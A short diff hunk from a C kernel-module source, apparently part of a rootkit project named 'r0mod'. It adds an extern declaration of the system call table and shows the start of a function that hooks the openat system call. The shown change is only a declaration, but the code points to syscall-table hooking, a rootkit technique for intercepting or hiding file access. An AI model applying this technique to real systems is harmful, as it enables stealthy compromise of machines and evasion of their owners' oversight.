@@ -12,6 +12,8 @@
 
 #include <r0mod/global.h>
 
+extern void **sys_call_table;
+
 void **sys_call_table;
 
 asmlinkage long _hook_sys_openat(unsigned int dfd,
